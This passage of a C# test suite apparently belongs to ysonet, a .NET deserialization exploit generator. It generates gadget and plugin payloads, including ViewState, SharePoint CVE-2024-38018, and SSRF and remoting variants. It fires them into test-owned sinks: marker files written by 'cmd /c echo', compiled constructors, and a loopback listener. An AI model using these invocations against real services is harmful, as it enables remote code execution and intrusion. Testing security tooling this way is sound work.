                new PluginCell("ThirdPartyGadgets", new[] { "-g", "GetterActiveMQObjectMessage", "-f", "Json.NET", "-i", "calc.exe" }),
                new PluginCell("ThirdPartyGadgets", new[] { "-g", "PreserveWorkingFolder", "-f", "Json.NET", "-i", "targetdir" }),
                new PluginCell("ThirdPartyGadgets", new[] { "-g", "OptimisticLockedTextFile", "-f", "Json.NET", "-i", "targetfile.txt" }),
                new PluginCell("ThirdPartyGadgets", new[] { "-g", "QueryPartitionProvider", "-f", "Json.NET", "-i", tpqpInner }),
                new PluginCell("ThirdPartyGadgets", new[] { "-g", "FileDiagnosticsTelemetryModule", "-f", "Json.NET", "-i", "targetdir" }),
                new PluginCell("ThirdPartyGadgets", new[] { "-g", "SingleProcessFileAppender", "-f", "Json.NET", "-i", "targetdir" }),
                new PluginCell("ThirdPartyGadgets", new[] { "-g", "FileDataStore", "-f", "Json.NET", "-i", "targetdir" }),

                new PluginCell("TransactionManagerReenlist", new[] { "-c", "calc.exe" }),

                new PluginCell("ViewState", new[] { "--dryrun", "--validationkey", vk }),
                new PluginCell("ViewState", new[] { "-g", "TypeConfuseDelegate", "-c", "calc.exe", "--validationkey", vk }),
                new PluginCell("ViewState", new[] { "--unsignedpayload", "AAECAwQFBgcICQ==", "--validationkey", vk }),
            };

            // CVE-2024-38018 needs the bundled SharePoint 2019 DLLs. Include it only when present.
            string sp2019 = Path.Combine(AppDomain.CurrentDomain.BaseDirectory,
                "dlls", "sharepoint", "19", "Microsoft.SharePoint.dll");
            if (File.Exists(sp2019))
                rows.Add(new PluginCell("SharePoint", new[] { "--cve", "CVE-2024-38018", "-c", "calc.exe" }));
            else
                Console.Error.WriteLine("  [skip] SharePoint CVE-2024-38018: bundled SharePoint 2019 DLLs not present");

            var excluded = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
            {
                { "ActivatorUrl", "makes a live remoting/network call and returns a status string, not a payload" },
                { "Clipboard", "writes the OS clipboard on an STA thread; covered by the dedicated clipboard tests" },
                { "Generic", "base plugin type, not a real plugin" },
            };

            bool trace = Environment.GetEnvironmentVariable("YSONET_TRACE") != null;
            var failures = new List<string>();
            var covered = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            try
            {
                foreach (PluginCell cell in rows)
                {
                    covered.Add(cell.Plugin);
                    IPlugin instance = PluginRegistry.CreatePluginInstance(cell.Plugin);
                    Type ptype = instance == null ? null : instance.GetType();
                    bool hasMinify = PluginHasMinify(instance);

                    // minify off, then on where supported
                    int passes = hasMinify ? 2 : 1;
                    for (int mp = 0; mp < passes; mp++)
                    {
                        bool minify = mp == 1;
                        string[] argv = cell.Argv;
                        if (minify)
                        {
                            argv = new string[cell.Argv.Length + 1];
                            Array.Copy(cell.Argv, argv, cell.Argv.Length);
                            argv[argv.Length - 1] = "--minify";
                        }

                        string desc = cell.Plugin + " " + string.Join(" ", cell.Argv) + (minify ? " --minify" : "");
                        if (trace) { Console.Error.WriteLine("    [plugin] " + desc); Console.Error.Flush(); }

                        ResetPluginStatics(ptype);
                        RunResult r;
                        try { r = PayloadRunner.RunPlugin(cell.Plugin, argv); }
                        catch (Exception ex) { failures.Add(desc + " -> THREW " + ex.Message); continue; }
                        if (!r.Success) { failures.Add(desc + " -> " + r.ErrorMessage); continue; }
                        if (RawIsEmpty(r.Raw)) { failures.Add(desc + " -> empty payload"); }
                    }
                }

                // Coverage guard: every discovered plugin is generated or excluded.
                foreach (string name in PluginRegistry.GetAllPluginNames())
                {
                    bool known = covered.Contains(name) || excluded.ContainsKey(name);
                    AssertTrue(known, "plugin " + name + " has no matrix row and no explicit exclusion (add one)");
                }
            }
            finally
            {
                try { File.Delete(innerJson); } catch { }
                try { File.Delete(tpqpInner); } catch { }
                try { File.Delete(csFixture); } catch { }
                try { File.Delete(resxOut); } catch { }
            }

            AssertTrue(failures.Count == 0,
                "plugin matrix cells failed (" + failures.Count + "):\n  " + string.Join("\n  ", failures.ToArray()));
        }

        private static bool PluginHasMinify(IPlugin plugin)
        {
            if (plugin == null) return false;
            foreach (OptionField f in OptionField.FromOptionSet(plugin.Options()))
                if (string.Equals(f.Name, "minify", StringComparison.OrdinalIgnoreCase))
                    return true;
            return false;
        }

        // ---- 6.3 payload execution into test-owned sinks ----

        // A loopback capture proxy: a TcpListener on 127.0.0.1:0 whose only job is to
        // notice that a connection arrived. An SSRF/callback/remoting payload pointed at
        // its Url makes the deserializer connect here; the accepted connection is the
        // proof it fired. No external traffic, no rogue server.
        private class LoopbackListener : IDisposable
        {
            private readonly System.Net.Sockets.TcpListener _listener;
            private readonly System.Threading.Thread _thread;
            private volatile bool _hit;
            private volatile bool _stop;
            public int Port { get; private set; }

            public LoopbackListener()
            {
                _listener = new System.Net.Sockets.TcpListener(System.Net.IPAddress.Loopback, 0);
                _listener.Start();
                Port = ((System.Net.IPEndPoint)_listener.LocalEndpoint).Port;
                _thread = new System.Threading.Thread(AcceptLoop);
                _thread.IsBackground = true;
                _thread.Start();
            }

            private void AcceptLoop()
            {
                try
                {
                    while (!_stop)
                    {
                        var client = _listener.AcceptTcpClient();
                        _hit = true;
                        try { client.Close(); } catch { }
                    }
                }
                catch { /* Stop() unblocks AcceptTcpClient with an exception */ }
            }

            public string HttpUrl { get { return "http://127.0.0.1:" + Port + "/x"; } }
            public string TcpUrl { get { return "tcp://127.0.0.1:" + Port + "/x"; } }

            public bool Fired(int totalMs)
            {
                int waited = 0;
                while (waited < totalMs && !_hit) { System.Threading.Thread.Sleep(50); waited += 50; }
                return _hit;
            }

            public void Dispose()
            {
                _stop = true;
                try { _listener.Stop(); } catch { }
            }
        }

        private static string MarkerPath(string tag)
        {
            return Path.Combine(Path.GetTempPath(), "ysonet_fire_" + tag + ".txt");
        }

        // A self-closing marker command: cmd /c echo x > "marker". Works whether or not
        // the caller (a plugin) wraps it again in cmd /c.
        private static string MarkerCommand(string marker)
        {
            return "cmd /c echo x > \"" + marker + "\"";
        }

        private static void SafeDelete(string path)
        {
            try { if (path != null && File.Exists(path)) File.Delete(path); } catch { }
        }

        private static void SafeDeleteDir(string path)
        {
            try { if (path != null && Directory.Exists(path)) Directory.Delete(path, true); } catch { }
        }

        // Fire a gadget through its OWN self-test path: generate with Test=true on an STA
        // thread, which runs the gadget's designed round-trip in-process and installs any
        // serializationBinder the gadget sets (for example PSObject's LocalBinder, which
        // resolves PSObject to the bundled recompiled vulnerable DLL - a plain deserialize
        // would resolve it to the patched GAC assembly and never fire). The marker file is
        // the proof. reasonIfSkipped is logged when the gadget does not fire on this machine
        // (a Mono-only gadget on .NET Framework, or a patched framework) - not a failure.
        private static void FireGadgetSelfTest(string gadget, string formatter, string reasonIfSkipped,
            List<string> failures, ref int fired, ref int skipped, bool trace)
        {
            string marker = MarkerPath(gadget + "_selftest");
            SafeDelete(marker);
            if (trace) { Console.Error.WriteLine("    [fire] " + gadget + " (self-test)"); Console.Error.Flush(); }
            try
            {
                RunSTA(delegate
                {
                    InputArgs ia = new InputArgs();
                    ia.Cmd = MarkerCommand(marker);
                    ia.IsRawCmd = true;
                    ia.Test = true; // the gadget's own self-test deserializes (fires) in-process
                    PayloadRunner.GenerateGadget(new GenerationRequest
                    {
                        GadgetName = gadget,
                        FormatterName = formatter,
                        OutputFormat = "",
                        InputArgs = ia,
                    });
                });
                if (WaitForFile(marker, 3000)) fired++;
                else { skipped++; Console.Error.WriteLine("  [skip] fire " + gadget + " (self-test): marker not created - " + reasonIfSkipped); }
            }
            catch (Exception ex) { skipped++; Console.Error.WriteLine("  [skip] fire " + gadget + " (self-test): " + ex.Message); }
            finally { SafeDelete(marker); }
        }

        // Generate the gadget's own payload with a marker command, deserialize it
        // in-process on an STA thread, and prove the command fired via the marker file.
        // formatter/deserialize helper are chosen per gadget by the caller.
        private static void FireGadgetMarker(string gadget, string formatter, int variant,
            bool minify, bool useSimpleType, string deserAs, bool required,
            List<string> failures, ref int fired, ref int skipped, bool trace)
        {
            string tag = gadget + "_" + formatter + (variant > 0 ? "_v" + variant : "") + (minify ? "_m" : "") + (useSimpleType ? "_u" : "");
            string marker = MarkerPath(tag);
            SafeDelete(marker);
            if (trace) { Console.Error.WriteLine("    [fire] " + tag); Console.Error.Flush(); }
            try
            {
                InputArgs ia = new InputArgs();
                ia.Cmd = MarkerCommand(marker);
                ia.IsRawCmd = true;
                ia.Test = false;
                ia.Minify = minify;
                ia.UseSimpleType = useSimpleType;
                if (variant > 0)
                    ia.ExtraArguments = new List<string> { "--variant", variant.ToString() };

                GenerationRequest req = new GenerationRequest
                {
                    GadgetName = gadget,
                    FormatterName = formatter,
                    OutputFormat = "",
                    InputArgs = ia,
                };
                RunResult r = PayloadRunner.GenerateGadget(req);
                if (!r.Success)
                {
                    string msg = "fire " + tag + ": generate -> " + r.ErrorMessage;
                    if (required) failures.Add(msg); else { skipped++; Console.Error.WriteLine("  [skip] " + msg); }
                    return;
                }

                RunSTA(delegate
                {
                    if (deserAs == "bf") SerializersHelper.BinaryFormatter_deserialize((byte[])r.Raw);
                    else if (deserAs == "xaml") SerializersHelper.Xaml_deserialize((string)r.Raw);
                    else if (deserAs == "json") SerializersHelper.JsonNet_deserialize((string)r.Raw);
                    else if (deserAs == "ndc") SerializersHelper.NetDataContractSerializer_deserialize((string)r.Raw);
                });

                if (WaitForFile(marker, 3000)) fired++;
                else
                {
                    string msg = "fire " + tag + ": marker not created";
                    if (required) failures.Add(msg); else { skipped++; Console.Error.WriteLine("  [skip] " + msg + " (conditional)"); }
                }
            }
            catch (Exception ex)
            {
                string msg = "fire " + tag + ": " + ex.Message;
                if (required) failures.Add(msg); else { skipped++; Console.Error.WriteLine("  [skip] " + msg); }
            }
            finally { SafeDelete(marker); }
        }

        // Fire a *FromFile compile gadget: feed it a .cs whose constructor writes the
        // marker, then let ysonet.exe deserialize (self-test) the BinaryFormatter payload
        // so the compiled assembly runs. This is done in a SUBPROCESS on purpose: these
        // gadgets run attacker-compiled code through XamlReader/Assembly.Load machinery
        // that can crash the host process (XamlAssemblyLoadFromFile exits non-zero after
        // firing), so isolating it keeps the test runner alive. The marker file is the
        // proof, independent of the subprocess exit code.
        private static void FireSelfClosingCs(string gadget, List<string> failures, ref int fired, ref int skipped, bool trace)
        {
            FireSelfClosingCs(gadget, failures, ref fired, ref skipped, trace, false);
        }

        // The 6-arg overload also fires the MINIFIED payload. For the compiled-assembly
        // gadgets this locks the XmlMinifier perf fix end-to-end: DataSetOldBehaviourFromFile
        // --minify used to take ~112s (encodingStyle O(n^2) regex), now it is fast and its
        // minified payload must still execute.
        private static void FireSelfClosingCs(string gadget, List<string> failures, ref int fired, ref int skipped, bool trace, bool minify)
        {
            FireSelfClosingCs(gadget, failures, ref fired, ref skipped, trace, minify, false);
        }

        // The 7-arg overload also fires the --compressed path (GZip-in-payload). It must still
        // Assembly.Load and run the compiled type after decompressing, just like the plain form.
        private static void FireSelfClosingCs(string gadget, List<string> failures, ref int fired, ref int skipped, bool trace, bool minify, bool compressed)
        {
            string label = gadget + (minify ? " (minify)" : "") + (compressed ? " (compressed)" : "");
            string exe = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ysonet.exe");
            if (!File.Exists(exe))
            {
                skipped++;
                Console.Error.WriteLine("  [skip] fire " + label + " (self-cs): ysonet.exe not found beside the test exe");
                return;
            }

            // Distinct marker/cs per minify state so a red test is unambiguous and the two
            // fires for one gadget never share files.
            string marker = MarkerPath(gadget + (minify ? "_min" : "") + (compressed ? "_c" : "") + "_selfcs");
            string cs = Path.Combine(Path.GetTempPath(), "ysonet_selfcs_" + (minify ? "min_" : "") + (compressed ? "c_" : "") + gadget + ".cs");
            SafeDelete(marker);
            File.WriteAllText(cs, "public class E { public E() { System.IO.File.WriteAllText(@\"" + marker + "\", \"x\"); } }");
            if (trace) { Console.Error.WriteLine("    [fire] " + label + " (self-cs subprocess)"); Console.Error.Flush(); }
            try
            {
                string extra = (minify ? " --minify" : "") + (compressed ? " --compressed" : "");
                var psi = new System.Diagnostics.ProcessStartInfo(exe,
                    "-g " + gadget + " -f BinaryFormatter -c \"" + cs + "\" -t" + extra);
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                using (var proc = System.Diagnostics.Process.Start(psi))
                {
                    // Drain the pipes so a large payload on stdout cannot deadlock the wait.
                    proc.OutputDataReceived += delegate { };
                    proc.ErrorDataReceived += delegate { };
                    proc.BeginOutputReadLine();
                    proc.BeginErrorReadLine();
                    if (!proc.WaitForExit(40000)) { try { proc.Kill(); } catch { } }
                }
                if (WaitForFile(marker, 2000)) fired++;
                else failures.Add("fire " + label + " (self-cs subprocess): marker not created");
            }
            catch (Exception ex) { failures.Add("fire " + label + " (self-cs): " + ex.Message); }
            finally { SafeDelete(marker); SafeDelete(cs); }
        }

        // Fire a plugin through its own -t self-test path into a marker sink.
        private static void FirePluginMarker(string plugin, string[] baseArgv, List<string> failures, ref int fired, bool trace)
        {
            string marker = MarkerPath("plugin_" + plugin + "_" + string.Join("_", baseArgv));
            SafeDelete(marker);
            var argv = new List<string>(baseArgv);
            argv.Add("-c"); argv.Add(MarkerCommand(marker));
            argv.Add("-t");
            if (trace) { Console.Error.WriteLine("    [fire] plugin " + plugin + " " + string.Join(" ", baseArgv)); Console.Error.Flush(); }
            try
            {
                IPlugin instance = PluginRegistry.CreatePluginInstance(plugin);
                ResetPluginStatics(instance == null ? null : instance.GetType());
                RunSTA(delegate { PayloadRunner.RunPlugin(plugin, argv.ToArray()); });
                if (WaitForFile(marker, 3500)) fired++;
                else failures.Add("fire plugin " + plugin + " " + string.Join(" ", baseArgv) + ": marker not created");
            }
            catch (Exception ex) { failures.Add("fire plugin " + plugin + ": " + ex.Message); }
            finally { SafeDelete(marker); }
        }

        // Fire Resx compileddotresources via a ysonet.exe subprocess self-test: it writes a
        // .resources file then reads it back through a ResourceSet, which resolves reliably in
        // a full ysonet process. The marker file is the proof.
        private static void FireResxCompiledSubprocess(List<string> failures, ref int fired, ref int skipped, bool trace)
        {
            string exe = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ysonet.exe");
            if (!File.Exists(exe))
            {
                skipped++;
                Console.Error.WriteLine("  [skip] fire Resx compileddotresources: ysonet.exe not found beside the test exe");
                return;
            }
            string marker = MarkerPath("plugin_Resx_compiled");
            string resxOut = Path.Combine(Path.GetTempPath(), "ysonet_fire.resources");
            SafeDelete(marker); SafeDelete(resxOut);
            if (trace) { Console.Error.WriteLine("    [fire] plugin Resx compileddotresources (subprocess)"); Console.Error.Flush(); }
            try
            {
                // Escape the inner quotes of the marker command for the child command line.
                string quotedCmd = "\"" + MarkerCommand(marker).Replace("\"", "\\\"") + "\"";
                string args = "-p Resx -M compileddotresources -of \"" + resxOut + "\" -c " + quotedCmd + " -t";
                var psi = new System.Diagnostics.ProcessStartInfo(exe, args);
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                using (var proc = System.Diagnostics.Process.Start(psi))
                {
                    proc.OutputDataReceived += delegate { };
                    proc.ErrorDataReceived += delegate { };
                    proc.BeginOutputReadLine();
                    proc.BeginErrorReadLine();
                    if (!proc.WaitForExit(40000)) { try { proc.Kill(); } catch { } }
                }
                if (WaitForFile(marker, 2000)) fired++;
                else failures.Add("fire plugin Resx compileddotresources (subprocess): marker not created");
            }
            catch (Exception ex) { failures.Add("fire plugin Resx compileddotresources: " + ex.Message); }
            finally { SafeDelete(marker); SafeDelete(resxOut); }
        }

        private static void PayloadsFireIntoTestSinks()
        {
            bool trace = Environment.GetEnvironmentVariable("YSONET_TRACE") != null;
            var failures = new List<string>();
            int fired = 0, skipped = 0;

            // ---- MARKER: gadgets whose BinaryFormatter output runs Process.Start on
            // deserialize (their own gadget, or a default inner TFRP/TCD). ----
            string[] bfMarkerGadgets =
            {
                "TextFormattingRunProperties", "TypeConfuseDelegate",
                "AxHostState", "DataSet", "DataSetTypeSpoof", "DataSetOldBehaviour",
                "ClaimsIdentity", "ClaimsPrincipal", "GenericPrincipal", "RolePrincipal",
                "SessionSecurityToken", "SessionViewStateHistoryItem", "ToolboxItemContainer",
                "WindowsIdentity", "WindowsPrincipal", "ResourceSet",
            };
            foreach (string g in bfMarkerGadgets)
                FireGadgetMarker(g, "BinaryFormatter", 0, false, false, "bf", true, failures, ref fired, ref skipped, trace);

            // Conditional MARKER (self-skip, not fail):
            // - WindowsClaimsIdentity needs a non-GAC assembly (Microsoft.IdentityModel, a
            //   NuGet dependency present here) to build the type on deserialize.
            FireGadgetMarker("WindowsClaimsIdentity", "BinaryFormatter", 0, false, false, "bf", false, failures, ref fired, ref skipped, trace);
            // - TypeConfuseDelegateMono targets the Mono delegate field layout (it sets BOTH
            //   invocation-list slots to Process.Start, unlike TypeConfuseDelegate which sets
            //   only the second). On .NET Framework that graph does not fire; generation is
            //   covered in 6.2. - PSObject fires only through its OWN self-test, which installs a
            //   LocalBinder to resolve PSObject to the bundled recompiled vulnerable DLL (a plain
            //   deserialize would resolve it to the patched GAC assembly). Fire both through the
            //   gadget's Test=true self-test (STA), which installs any binder the gadget needs.
            FireGadgetSelfTest("TypeConfuseDelegateMono", "BinaryFormatter",
                "Mono delegate layout; fires on Mono, not on .NET Framework", failures, ref fired, ref skipped, trace);
            FireGadgetSelfTest("PSObject", "BinaryFormatter",
                "CVE-2017-8565 is patched on this framework; PSObject fires only on an unpatched target", failures, ref fired, ref skipped, trace);

            // MARKER via Xaml / Json.NET deserialize (STA).
            FireGadgetMarker("ObjectDataProvider", "Xaml", 1, false, false, "xaml", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("GetterSecurityException", "Json.NET", 0, false, false, "json", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("GetterSettingsPropertyValue", "Json.NET", 0, false, false, "json", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("GetterSettingsPropertyValue", "Xaml", 0, false, false, "xaml", true, failures, ref fired, ref skipped, trace);

            // Minify CORRECTNESS: a minified payload must still FIRE, not merely be non-empty.
            // Fire EVERY BinaryFormatter marker gadget again with --minify (the BinaryFormatter
            // minify path), so the minifier is proven not to break execution for any of them.
            foreach (string g in bfMarkerGadgets)
                FireGadgetMarker(g, "BinaryFormatter", 0, true, false, "bf", true, failures, ref fired, ref skipped, trace);
            // The Xaml (XmlMinifier) and Json.NET (JsonMinifier) deserialize paths, minified too,
            // so all three minifier families are covered end-to-end, not just BinaryFormatter.
            FireGadgetMarker("ObjectDataProvider", "Xaml", 1, true, false, "xaml", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("GetterSettingsPropertyValue", "Xaml", 0, true, false, "xaml", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("GetterSecurityException", "Json.NET", 0, true, false, "json", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("GetterSettingsPropertyValue", "Json.NET", 0, true, false, "json", true, failures, ref fired, ref skipped, trace);

            // --usesimpletype on a Json.NET-family payload must still fire (minified).
            FireGadgetMarker("GetterSecurityException", "Json.NET", 0, true, true, "json", true, failures, ref fired, ref skipped, trace);

            // ResourceSet via NetDataContractSerializer, non-minified AND minified. The minified
            // form is the INTENTIONAL fragment the matrix well-formedness check exempts (its
            // generator discards </Values></Table></w>). Firing both proves that truncated
            // fragment still deserializes and executes, so the exemption is backed by a real
            // firing rather than only skipped.
            FireGadgetMarker("ResourceSet", "NetDataContractSerializer", 0, false, false, "ndc", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("ResourceSet", "NetDataContractSerializer", 0, true, false, "ndc", true, failures, ref fired, ref skipped, trace);

            // ---- SELF_CLOSING_CS: compile-and-run gadgets whose compiled ctor writes the marker. ----
            FireSelfClosingCs("ActivitySurrogateSelectorFromFile", failures, ref fired, ref skipped, trace);
            FireSelfClosingCs("XamlAssemblyLoadFromFile", failures, ref fired, ref skipped, trace);
            FireSelfClosingCs("DataSetOldBehaviourFromFile", failures, ref fired, ref skipped, trace);
            // Same three gadgets, MINIFIED. DataSetOldBehaviourFromFile --minify was the
            // ~112s XmlMinifier perf case; its minified payload must generate fast and still
            // fire. The other two were already fast and are cheap to cover.
            FireSelfClosingCs("ActivitySurrogateSelectorFromFile", failures, ref fired, ref skipped, trace, true);
            FireSelfClosingCs("XamlAssemblyLoadFromFile", failures, ref fired, ref skipped, trace, true);
            FireSelfClosingCs("DataSetOldBehaviourFromFile", failures, ref fired, ref skipped, trace, true);
            // DataSetOldBehaviourFromFile --compressed (GZip the embedded assembly): the payload
            // must decompress it via a GZipStream and still Assembly.Load + run the type. Cover
            // both compressed and compressed+minify (the minified form is what a user ships).
            FireSelfClosingCs("DataSetOldBehaviourFromFile", failures, ref fired, ref skipped, trace, false, true);
            FireSelfClosingCs("DataSetOldBehaviourFromFile", failures, ref fired, ref skipped, trace, true, true);

            // ---- Plugin MARKER via each plugin's own -t self-test path. ----
            FirePluginMarker("Altserialization", new[] { "-M", "HttpStaticObjectsCollection" }, failures, ref fired, trace);
            FirePluginMarker("Altserialization", new[] { "-M", "SessionStateItemCollection" }, failures, ref fired, trace);
            FirePluginMarker("ApplicationTrust", new string[0], failures, ref fired, trace);
            FirePluginMarker("TransactionManagerReenlist", new string[0], failures, ref fired, trace);

            // Resx compileddotresources fires via a ResourceSet over the generated .resources
            // file. That read is reliable in a fresh process (it needs ysonet's assembly
            // resolver), so fire it via a subprocess self-test rather than in-process.
            FireResxCompiledSubprocess(failures, ref fired, ref skipped, trace);

            // ---- TEMPDIR: NetNonRce FileLogTraceListener creates a directory on deserialize,
            // for all three formatter payloads (the JSON/XML input-escaping fix makes the Json.NET
            // and JavaScriptSerializer paths honour a Windows path with backslashes too). ----
            foreach (string fmt in new[] { "Json.NET", "JavaScriptSerializer", "Xaml" })
                FireNetNonRceTempDir(fmt, failures, ref fired, trace);

            // ---- LISTENER: SSRF/callback payloads connect to a loopback capture proxy. ----
            foreach (string gadget in new[] { "PictureBox", "InfiniteProgressPage" })
                foreach (string fmt in new[] { "Json.NET", "JavaScriptSerializer", "Xaml" })
                    FireNetNonRceListener(gadget, fmt, failures, ref fired, trace);

            // ObjectDataProvider variant 3 is the xamlurl SSRF variant: it fetches the URL on load.
            FireOdpXamlUrlListener(failures, ref fired, trace);

            // ObjRef remoting is finicky (needs a process-global client channel); best-effort.
            FireObjRefListener(failures, ref fired, ref skipped, trace);

            AssertTrue(fired > 25, "fired a large set of payloads into test-owned sinks (was " + fired + ", skipped " + skipped + ")");
            AssertTrue(failures.Count == 0,
                "execution cells failed (" + failures.Count + ", fired " + fired + ", skipped " + skipped + "):\n  "
                + string.Join("\n  ", failures.ToArray()));
        }

        private static void FireNetNonRceTempDir(string formatter, List<string> failures, ref int fired, bool trace)
        {
            string dir = Path.Combine(Path.GetTempPath(), "ysonet_firedir_" + formatter.Replace(".", ""));
            SafeDeleteDir(dir);
            if (trace) { Console.Error.WriteLine("    [fire] NetNonRce FileLogTraceListener " + formatter + " (tempdir)"); Console.Error.Flush(); }
            try
            {
                var argv = new[] { "-g", "FileLogTraceListener", "-f", formatter, "-i", dir, "-t" };
                IPlugin p = PluginRegistry.CreatePluginInstance("NetNonRceGadgets");
                ResetPluginStatics(p == null ? null : p.GetType());
                RunSTA(delegate { PayloadRunner.RunPlugin("NetNonRceGadgets", argv); });
                bool ok = WaitForDir(dir, 3000);
                if (ok) fired++;
                else failures.Add("fire NetNonRce FileLogTraceListener " + formatter + ": directory not created");
            }
            catch (Exception ex) { failures.Add("fire NetNonRce FileLogTraceListener " + formatter + ": " + ex.Message); }
            finally { SafeDeleteDir(dir); }
        }

        private static void FireNetNonRceListener(string gadget, string formatter, List<string> failures, ref int fired, bool trace)
        {
            if (trace) { Console.Error.WriteLine("    [fire] NetNonRce " + gadget + " " + formatter + " (listener)"); Console.Error.Flush(); }
            using (var listener = new LoopbackListener())
            {
                try
                {
                    var argv = new[] { "-g", gadget, "-f", formatter, "-i", listener.HttpUrl, "-t" };
                    IPlugin p = PluginRegistry.CreatePluginInstance("NetNonRceGadgets");
                    ResetPluginStatics(p == null ? null : p.GetType());
                    RunSTA(delegate { PayloadRunner.RunPlugin("NetNonRceGadgets", argv); });
                    if (listener.Fired(3000)) fired++;
                    else failures.Add("fire NetNonRce " + gadget + " " + formatter + ": listener not hit");
                }
                catch (Exception ex) { failures.Add("fire NetNonRce " + gadget + " " + formatter + ": " + ex.Message); }
            }
        }

        private static void FireOdpXamlUrlListener(List<string> failures, ref int fired, bool trace)
        {
            if (trace) { Console.Error.WriteLine("    [fire] ObjectDataProvider v3 xamlurl (listener)"); Console.Error.Flush(); }
            using (var listener = new LoopbackListener())
            {
                try
                {
                    InputArgs ia = new InputArgs();
                    ia.Cmd = "calc.exe"; // ignored by variant 3
                    ia.Test = false;
                    ia.ExtraArguments = new List<string> { "--variant", "3", "--xamlurl", listener.HttpUrl };
                    GenerationRequest req = new GenerationRequest
                    {
                        GadgetName = "ObjectDataProvider",
                        FormatterName = "Xaml",
                        OutputFormat = "",
                        InputArgs = ia,
                    };
                    RunResult r = PayloadRunner.GenerateGadget(req);
                    if (!r.Success || !(r.Raw is string)) { failures.Add("fire ObjectDataProvider v3: generate -> " + (r.Success ? "not string" : r.ErrorMessage)); return; }
                    RunSTA(delegate { SerializersHelper.Xaml_deserialize((string)r.Raw); });
                    if (listener.Fired(3000)) fired++;
                    else failures.Add("fire ObjectDataProvider v3 (xamlurl SSRF): listener not hit");
                }
                catch (Exception ex) { failures.Add("fire ObjectDataProvider v3: " + ex.Message); }
            }
        }

        // ObjRef makes an outbound .NET Remoting call to the -c URL on deserialize, but the
        // runtime only emits it when a matching client channel is registered (process-global).
        // Best-effort: register a client channel, fire, capture the connection, unregister.
        private static void FireObjRefListener(List<string> failures, ref int fired, ref int skipped, bool trace)
        {
            if (trace) { Console.Error.WriteLine("    [fire] ObjRef remoting (listener, best-effort)"); Console.Error.Flush(); }
            System.Runtime.Remoting.Channels.IChannel channel = null;
            using (var listener = new LoopbackListener())
            {
                try
                {
                    channel = new System.Runtime.Remoting.Channels.Tcp.TcpClientChannel(
                        "ysonet_objref_" + listener.Port, null);
                    System.Runtime.Remoting.Channels.ChannelServices.RegisterChannel(channel, false);

                    InputArgs ia = new InputArgs();
                    ia.Cmd = listener.TcpUrl;
                    ia.Test = false;
                    GenerationRequest req = new GenerationRequest
                    {
                        GadgetName = "ObjRef",
                        FormatterName = "BinaryFormatter",
                        OutputFormat = "",
                        InputArgs = ia,
                    };
                    RunResult r = PayloadRunner.GenerateGadget(req);
                    if (!r.Success || !(r.Raw is byte[]))
                    {
                        skipped++;
                        Console.Error.WriteLine("  [skip] fire ObjRef: generate -> " + (r.Success ? "not byte[]" : r.ErrorMessage));
                        return;
                    }
                    RunSTA(delegate { SerializersHelper.BinaryFormatter_deserialize((byte[])r.Raw); });
                    if (listener.Fired(3000)) fired++;
                    else { skipped++; Console.Error.WriteLine("  [skip] fire ObjRef: listener not hit (remoting client channel did not emit)"); }
                }
                catch (Exception ex) { skipped++; Console.Error.WriteLine("  [skip] fire ObjRef: " + ex.Message); }
                finally
                {
                    if (channel != null)
                        try { System.Runtime.Remoting.Channels.ChannelServices.UnregisterChannel(channel); } catch { }
                }
            }
        }

        private static bool WaitForDir(string path, int totalMs)
        {
            int waited = 0;
            while (waited < totalMs)
            {
                if (Directory.Exists(path)) return true;
                System.Threading.Thread.Sleep(100);
                waited += 100;
            }
            return Directory.Exists(path);
        }

        // ---- helpers -----------------------------------------------------------

        // Drive the wizard with a scripted key source and return the bytes written
        // to the stdout stream. Captured stderr (prompts, menus, echo) is returned
        // too. All input (menus and free text) comes through the key reader.
        private static byte[] DriveWizard(IKeyReader keys, out string stderr)
        {
            var payload = new MemoryStream();
            TextWriter savedErr = Console.Error;
            StringWriter err = new StringWriter();
            Console.SetError(err);
            ModuleEditor.ForceFallback = true; // drive the deterministic single-panel path
            try
            {
                Wizard w = new Wizard(keys, payload);
                w.Run();
            }
            finally
            {
                Console.SetError(savedErr);
            }
            stderr = err.ToString();
            return payload.ToArray();
        }

        // Run an interactive widget while swallowing its stderr rendering.
        private static T WithSwallowedError<T>(Func<T> action)
        {
            TextWriter savedErr = Console.Error;
            Console.SetError(new StringWriter());
            try { return action(); }
            finally { Console.SetError(savedErr); }
        }


        private static byte[] GenerateOdpJson(string cmd)
        {
            return GenerateOdpJson(cmd, false);
        }

        private static byte[] GenerateOdpJson(string cmd, bool minify)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = cmd;
            ia.Minify = minify;
            GenerationRequest req = new GenerationRequest();
            req.GadgetName = "ObjectDataProvider";
            req.FormatterName = "Json.NET";
            req.OutputFormat = "";
            req.InputArgs = ia;
            RunResult r = PayloadRunner.GenerateGadget(req);
            if (!r.Success)
                throw new Exception("core generation failed: " + r.ErrorMessage);
            int len;
            return PayloadRunner.Encode(r.Raw, r.EffectiveOutputFormat, out len);
        }

        private static OptionField FindField(List<OptionField> fields, string name)
        {
            foreach (OptionField f in fields)
                if (string.Equals(f.Name, name, StringComparison.OrdinalIgnoreCase))
                    return f;
            return null;
        }

        private static bool BytesEqual(byte[] a, byte[] b)
        {
            if (a == null || b == null) return a == b;
            if (a.Length != b.Length) return false;
            for (int i = 0; i < a.Length; i++)
                if (a[i] != b[i]) return false;
            return true;
        }

        private static void Run(string name, Action test)
        {
            try
            {
                test();
                _passed++;
                Console.Error.WriteLine("[PASS] " + name);
            }
            catch (Exception e)
            {
                _failed++;
                Console.Error.WriteLine("[FAIL] " + name + " -> " + e.Message);
            }
        }

        private static void AssertTrue(bool cond, string msg)
        {
            if (!cond)
                throw new Exception("expected true: " + msg);
        }

